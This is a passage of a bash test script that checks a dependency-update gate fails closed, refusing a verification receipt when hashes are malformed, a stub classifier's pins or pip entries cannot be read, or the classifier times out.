vpr_case "a hash that is not 64 hex is refused" 1 'not a sha256' PyYAML 6.0.3 'abc'
vpr_case "a release with no files and no hashes to check is refused" 1 'no files' Empty 1.0 ''

# And the fail-open the loops used to have. `while ... done < <(python3 ...)`
# reports the redirection's status, so a producer that died left the loop with
# nothing to read, the counter at zero, and a sealed receipt claiming the pins
# were verified. The classifier here declares a pin it does not describe, which
# is the one thing that makes the extractor die on real input.
fake_scripts="$stub_dir/badscripts"; mkdir -p "$fake_scripts"
cat > "$fake_scripts/classify_dependency_bump.py" <<'STUB'
import json, sys
sys.stdin.read()
json.dump({"verdict": "dependency-bump", "files": {"a.yml": "workflow"},
           "changed_lines": 2, "pins": [{"action": "o/r", "sha": "a" * 40}],
           "images": []}, sys.stdout)
STUB
DEP_SCRIPTS="$fake_scripts"
dout="$(dep_gate "$dp/pin.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a pin the gate could not read refuses the receipt, rather than counting zero"
else
    bad "a verdict whose pins could not be read still earned a receipt (rc=$drc)"
fi
# The pip loop skips a blank line, the way the pin loop does. Tab is IFS
# whitespace, so `read` collapses empty fields, and only an entry with every
# field empty reaches the skip. A verdict that declares a package the loop
# then skips must not receipt "0 pip package(s) verified" about a diff that
# pinned one.
cat > "$fake_scripts/classify_dependency_bump.py" <<'STUB'
import json, sys
sys.stdin.read()
json.dump({"verdict": "dependency-bump", "files": {"requirements.txt": "pip-requirements"},
           "changed_lines": 2, "pins": [], "images": [],
           "pip": [{"name": "", "version": "", "hashes": []}]}, sys.stdout)
STUB
dout="$(dep_gate "$dp/pip.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'declared 1 pip package' <<<"$dout" \
   && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a pip package the gate skipped refuses the receipt, rather than counting zero"
else
    bad "a pip package the gate skipped refuses the receipt, and this one did not (rc=$drc)"
fi
# A classifier that never answers must not stall an unattended run or pass.
cat > "$fake_scripts/classify_dependency_bump.py" <<'STUB'
import time
time.sleep(30)
STUB
dout="$(MAINTAINER_CLASSIFY_TIMEOUT=2 dep_gate "$dp/pip.patch" unused)"; drc=$?
if [ "$drc" != 0 ] && grep -q 'ran past 2s' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
    ok "a classifier that runs out of time refuses the receipt"
else
    bad "a classifier that runs out of time did not refuse by name (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-140)"
fi
unset DEP_SCRIPTS
rm -f "$stub_dir/gh"
if sc_case 1; then
grep -qE 'observed\|dependency|dependency\|observed' "$root/bin/maintainer-merge" \
    && ok "an unattended run may merge on a dependency receipt" \
    || bad "a dependency receipt is still 'not observed' to cmd_merge"
sc_end; fi

